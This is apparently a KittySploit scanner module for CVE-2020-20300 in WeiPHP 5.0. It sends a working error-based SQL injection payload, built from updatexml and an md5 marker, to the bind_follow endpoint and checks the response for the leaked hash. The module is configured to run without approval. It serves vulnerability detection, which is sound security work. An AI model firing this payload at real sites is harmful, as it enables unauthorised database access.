#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WeiPHP 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WeiPHP 5.0 - SQL Injection Detection',
        'description': 'WeiPHP 5.0 contains a SQL injection vulnerability via the wp_where function. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'weiphp', 'sql', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/Y4er/Y4er.com/blob/15f49973707f9d526a059470a074cb6e38a0e1ba/content/post/weiphp-exp-sql.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-20300',
            'https://github.com/Y4er/Y4er.com/blob/master/content/post/weiphp-exp-sql.md',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-20300',
    }

    def run(self):
        path = "/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5('999999'),0x7e),1)--+ "
        r = self.http_request(method='POST', path=path, allow_redirects=False)
        if not r or r.status_code != 500:
            return False
        body = r.text or ""
        body_any = ('52c69e3a57331081823331c4e69d3f2',)
        if any(m in body for m in body_any):
            self.set_info(
                severity='critical',
                reason='WeiPHP 5.0 - SQL Injection detected',
                path=path,
            )
            return True
        return False

